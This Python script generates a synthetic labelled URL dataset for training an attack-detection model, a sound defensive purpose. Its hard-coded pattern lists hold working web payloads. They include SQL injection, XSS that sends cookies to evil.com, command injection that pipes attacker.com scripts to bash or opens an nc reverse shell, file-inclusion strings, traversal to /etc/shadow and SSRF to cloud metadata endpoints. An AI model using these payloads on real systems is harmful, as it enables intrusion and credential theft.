"""
Generate synthetic attack dataset for training ML model
Uses various attack patterns and benign URLs
"""
import random
import json
import csv
from pathlib import Path
from typing import List, Dict
from datetime import datetime, timedelta
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DatasetGenerator:
    """Generate synthetic URL attack dataset"""
    
    def __init__(self, output_dir: Path = None):
        """Initialize generator"""
        if output_dir is None:
            output_dir = Path(__file__).parent.parent / 'data'
        
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.attack_patterns = self._load_attack_patterns()
        self.benign_patterns = self._load_benign_patterns()
    
    def _load_attack_patterns(self) -> Dict[str, List[str]]:
        """Load attack URL patterns"""
        return {
            'SQLi': [
                "/login.php?user=' OR '1'='1",
                "/search?q=' UNION SELECT username,password FROM users--",
                "/product?id=1' AND 1=1--",
                "/api/user?name=admin' OR 1=1#",
                "/page.php?id=-1 UNION SELECT 1,2,3,4,5--",
                "/login?user=admin'--",
                "/search.php?q='; DROP TABLE users--",
                "/view?id=1'; WAITFOR DELAY '00:00:05'--",
                "/query?sql=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "/api?id=1' AND SLEEP(5)--",
                "/products?category=electronics' UNION ALL SELECT NULL,CONCAT(0x3a,0x3a,0x3a)--",
                "/account?user=test' OR 'x'='x",
                "/details?item=1' UNION SELECT version(),database(),user()--",
                "/profile?id=1 OR 1=1",
                "/news.php?id=5 UNION SELECT NULL,@@version--",
            ],
            'XSS': [
                "/search?q=<script>alert('XSS')</script>",
                "/comment?text=<img src=x onerror=alert(1)>",
                "/profile?name=<svg/onload=alert('XSS')>",
                "/page?input=<iframe src='javascript:alert(1)'>",
                "/search?q=<body onload=alert('XSS')>",
                "/post?content=<script>document.location='http://evil.com'</script>",
                "/message?text=<img src='x' onerror='alert(document.cookie)'>",
                "/feedback?comment=<script src='http://malicious.com/xss.js'></script>",
                "/form?data=javascript:alert(1)",
                "/user?name=<img src=x onerror=this.src='http://evil.com/'+document.cookie>",
                "/input?value=<svg><script>alert(1)</script></svg>",
                "/test?param=<iframe src=javascript:alert('XSS')>",
                "/search?q=<input onfocus=alert(1) autofocus>",
                "/page?content=<details open ontoggle=alert(1)>",
                "/comment?text=<marquee onstart=alert(1)>",
            ],
            'CMD Injection': [
                "/exec?cmd=ls -la",
                "/system?command=whoami",
                "/run?cmd=cat /etc/passwd",
                "/shell?exec=ls; whoami",
                "/api?cmd=id | grep uid",
                "/ping?host=127.0.0.1; cat /etc/shadow",
                "/tool?cmd=`whoami`",
                "/execute?command=$(cat /etc/passwd)",
                "/run?cmd=ls && cat /etc/hosts",
                "/system?exec=uname -a; ls -al",
                "/api/exec?cmd=wget http://evil.com/backdoor.sh",
                "/diagnostic?cmd=ping 127.0.0.1 && ls",
                "/test?cmd=; curl http://attacker.com/shell.sh | bash",
                "/admin?cmd=nc -e /bin/sh 10.0.0.1 4444",
                "/tools?exec=python -c 'import os; os.system(\"ls\")'",
            ],
            'Directory Traversal': [
                "/download?file=../../../../etc/passwd",
                "/read?path=../../../etc/shadow",
                "/view?doc=../../windows/system32/config/sam",
                "/get?file=....//....//....//etc/passwd",
                "/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "/static?file=..\\..\\..\\windows\\system32\\config\\sam",
                "/download?path=../../../../proc/self/environ",
                "/docs?file=../../../var/log/apache2/access.log",
                "/api/file?name=..%2f..%2f..%2fetc%2fpasswd",
                "/content?page=../../../../usr/local/apache2/conf/httpd.conf",
                "/read?f=../../../../../../etc/hosts",
                "/viewer?document=..%5c..%5c..%5cwindows%5csystem.ini",
                "/download?file=....//....//....//....//windows//system32//drivers//etc//hosts",
                "/resource?path=..%252f..%252f..%252fetc%252fpasswd",
                "/file?name=../../../../../../../boot.ini",
            ],
            'LFI/RFI': [
                "/include?page=http://evil.com/shell.txt",
                "/load?file=file:///etc/passwd",
                "/template?include=http://attacker.com/backdoor.php",
                "/page?file=php://input",
                "/view?include=php://filter/convert.base64-encode/resource=config.php",
                "/lang?file=../../../../etc/passwd%00",
                "/template?page=data:text/html,<script>alert(1)</script>",
                "/include?f=expect://ls",
                "/page?file=http://evil.com/malware.txt",
                "/load?include=php://filter/resource=../../../config.php",
                "/view?page=http://malicious.com/webshell.txt",
                "/template?file=zip://shell.zip#shell.php",
                "/include?page=phar://shell.phar/shell.php",
                "/lang?file=../../../../proc/self/environ",
                "/page?include=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            ],
            'SSRF': [
                "/fetch?url=http://169.254.169.254/latest/meta-data/",
                "/proxy?url=http://localhost:22",
                "/api?redirect=http://127.0.0.1:6379",
                "/webhook?url=http://192.168.1.1/admin",
                "/image?src=http://169.254.169.254/latest/user-data",
                "/fetch?url=http://[::1]:80",
                "/proxy?target=http://10.0.0.1:8080/admin",
                "/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
                "/webhook?callback=http://localhost:3000/admin",
                "/redirect?url=http://169.254.169.254/latest/api/token",
                "/image?url=file:///etc/passwd",
                "/api?endpoint=http://172.17.0.1:9000",
                "/proxy?url=gopher://127.0.0.1:6379/_SET%20key%20value",
                "/fetch?url=dict://localhost:11211/stats",
                "/webhook?url=http://169.254.170.2/v2/credentials/",
            ],
            'Web Shell': [
                "/uploads/shell.php?cmd=ls",
                "/files/c99.php",
                "/temp/backdoor.asp",
                "/media/r57.php",
                "/images/cmd.jsp?command=whoami",
                "/assets/webshell.aspx",
                "/public/b374k.php",
                "/static/shell.php?action=exec",
                "/uploads/backdoor.php?cmd=cat%20/etc/passwd",
                "/files/wso.php",
                "/temp/shell.jsp",
                "/media/eval.php?code=system('ls')",
                "/assets/cmd.php?c=whoami",
                "/public/reverse.php",
                "/uploads/shell.asp",
            ],
            'Credential Stuffing': [
                "/login?username=admin&password=admin123",
                "/api/auth?user=admin&pass=password",
                "/signin?email=admin@site.com&pwd=12345678",
                "/auth?username=root&password=root",
                "/login?user=administrator&pass=admin",
                "/api/login?username=admin&password=admin",
                "/signin?user=admin&pwd=password123",
                "/auth?email=admin@example.com&password=Password1!",
                "/login?username=test&password=test123",
                "/api/auth?user=admin&pass=qwerty",
            ],
            'Typosquatting': [
                "/redirect?url=http://gооgle.com",  # Cyrillic 'o'
                "/link?to=http://faⅽebook.com",
                "/goto?url=http://paypaⅼ.com",
                "/proxy?site=http://microsоft.com",
                "/redirect?url=http://аmazon.com",
            ],
            'HTTP Parameter Pollution': [
                "/search?q=test&q=<script>alert(1)</script>",
                "/api?id=1&id=2&id=3",
                "/login?username=admin&username=' OR '1'='1",
                "/filter?category=books&category=../../etc/passwd",
                "/search?query=test&query='; DROP TABLE users--",
            ],
            'XXE': [
                "/api/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "/parse?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>",
                "/upload?content=<!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/shadow'>]>",
                "/api/process?data=<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>",
                "/xml?data=<!DOCTYPE doc [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]>",
            ]
        }
    
    def _load_benign_patterns(self) -> List[str]:
        """Load benign URL patterns"""
        return [
            "/",
            "/index.html",
            "/about",
            "/contact",
            "/products",
            "/services",
            "/blog",
            "/news",
            "/faq",
            "/help",
            "/profile",
            "/dashboard",
            "/settings",
            "/api/users",
            "/api/products",
            "/search?q=laptop",
            "/category?name=electronics",
            "/product?id=123",
            "/user/profile",
            "/account/settings",
            "/cart/checkout",
            "/blog/post-title",
            "/articles/technology",
            "/docs/guide",
            "/support/tickets",
            "/api/v1/data",
            "/images/logo.png",
            "/css/style.css",
            "/js/app.js",
            "/fonts/roboto.woff",
            "/favicon.ico",
            "/sitemap.xml",
            "/robots.txt",
            "/login",
            "/register",
            "/logout",
            "/password/reset",
            "/email/verify",
            "/terms",
            "/privacy",
            "/admin/dashboard",
            "/api/health",
            "/status",
        ]
    
    def generate(self, total_samples: int = 10000, 
                attack_ratio: float = 0.3) -> List[Dict]:
        """
        Generate dataset
        
        Args:
            total_samples: Total number of samples to generate
            attack_ratio: Ratio of attack samples (0-1)
        
        Returns:
            List of sample dictionaries
        """
        logger.info(f"Generating {total_samples} samples (attack ratio: {attack_ratio})")
        
        num_attacks = int(total_samples * attack_ratio)
        num_benign = total_samples - num_attacks
        
        dataset = []
        
        # Generate attack samples
        attack_types = list(self.attack_patterns.keys())
        for i in range(num_attacks):
            attack_type = random.choice(attack_types)
            url_pattern = random.choice(self.attack_patterns[attack_type])
            
            sample = self._create_sample(url_pattern, attack_type)
            dataset.append(sample)
        
        # Generate benign samples
        for i in range(num_benign):
            url_pattern = random.choice(self.benign_patterns)
            sample = self._create_sample(url_pattern, 'Benign')
            dataset.append(sample)
        
        # Shuffle dataset
        random.shuffle(dataset)
        
        logger.info(f"Generated {len(dataset)} samples")
        return dataset
    
    def _create_sample(self, url_pattern: str, label: str) -> Dict:
        """Create a single sample"""
        # Generate random IP
        src_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        # Random host
        hosts = ['victim-server.com', 'webapp.example.com', 'api.target.com', 'www.site.com']
        host = random.choice(hosts)
        
        # Build full URL
        if not url_pattern.startswith('http'):
            url = f"http://{host}{url_pattern}"
        else:
            url = url_pattern
        
        # Random timestamp (last 30 days)
        timestamp = (datetime.now() - timedelta(days=random.randint(0, 30))).isoformat()
        
        # Random method
        methods = ['GET', 'POST', 'PUT', 'DELETE']
        weights = [0.7, 0.2, 0.05, 0.05]
        method = random.choices(methods, weights=weights)[0]
        
        return {
            'url': url,
            'src_ip': src_ip,
            'dst_ip': '10.0.0.100',
            'host': host,
            'timestamp': timestamp,
            'method': method,
            'label': label
        }
    
    def save_csv(self, dataset: List[Dict], filename: str = 'attack_dataset.csv'):
        """Save dataset to CSV"""
        filepath = self.output_dir / filename
        
        with open(filepath, 'w', newline='', encoding='utf-8') as f:
            if not dataset:
                return filepath
            
            fieldnames = dataset[0].keys()
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            
            writer.writeheader()
            writer.writerows(dataset)
        
        logger.info(f"Saved dataset to {filepath}")
        return filepath
    
    def save_json(self, dataset: List[Dict], filename: str = 'attack_dataset.json'):
        """Save dataset to JSON"""
        filepath = self.output_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(dataset, f, indent=2)
        
        logger.info(f"Saved dataset to {filepath}")
        return filepath

def main():
    """Generate and save dataset"""
    generator = DatasetGenerator()
    
    # Generate training dataset (10,000 samples)
    train_dataset = generator.generate(total_samples=10000, attack_ratio=0.3)
    generator.save_csv(train_dataset, 'train_dataset.csv')
    generator.save_json(train_dataset, 'train_dataset.json')
    
    # Generate test dataset (2,000 samples)
    test_dataset = generator.generate(total_samples=2000, attack_ratio=0.3)
    generator.save_csv(test_dataset, 'test_dataset.csv')
    generator.save_json(test_dataset, 'test_dataset.json')
    
    # Print statistics
    attack_counts = {}
    for sample in train_dataset:
        label = sample['label']
        attack_counts[label] = attack_counts.get(label, 0) + 1
    
    logger.info("\nTraining Dataset Statistics:")
    for label, count in sorted(attack_counts.items()):
        logger.info(f"  {label}: {count} samples")

if __name__ == '__main__':
    main()
